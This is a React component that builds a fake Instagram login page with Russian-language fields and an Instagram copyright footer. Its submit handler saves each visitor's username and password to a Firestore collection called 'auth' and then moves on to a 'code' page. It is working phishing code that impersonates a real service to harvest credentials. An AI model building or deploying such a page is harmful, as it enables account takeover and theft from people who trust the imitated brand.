import React, { useState } from 'react';
import {firestore} from './App';

export default function LoginPage(props) {
    const [login, setLogin] = useState("");
    const [password, setPassword] = useState("");

    const changeLogin = (e) => {
        setLogin(e.target.value)
    }
    
    const changePassword = (e) => {
        setPassword(e.target.value)
      }

      const authSubmit = (e) => {
        e.preventDefault();

        if (!login && !password) {
            return;
        }

        firestore.collection('auth').add({
          loginData: login,
          passwordData: password
        }).then(() => {
            props.changePage('code');
        })
      }

    return (
        <div className="loginPage">
            <div className="main">
                <div className="content">
                    <div className="logo"></div>
                    <span className="error">{props.error}</span>
                    <div className="formContainer">
                        <form className="form" onSubmit={authSubmit}>
                            <label className="label">
                                <span class="labelSpan">Телефон, имя пользователя или эл. адрес</span>
                                <input className="input" aria-label="Телефон, имя пользователя или эл. адрес" name="username" type="text" value={login} onChange={changeLogin} />
                            </label>

                            <label className="label">
                                <span class="labelSpan">Пароль</span>
                                <input className="input" aria-label="Телефон, имя пользователя или эл. адрес" name="password" type="password" value={password} onChange={changePassword} />
                            </label>

                            <button className="submitBtn" type="submit">Войти</button>
                        </form>

                        
                    </div>
                </div>
                <div className="copyRight">© Instagram от Facebook, 2021</div>
            </div>
            
        </div>
    )
}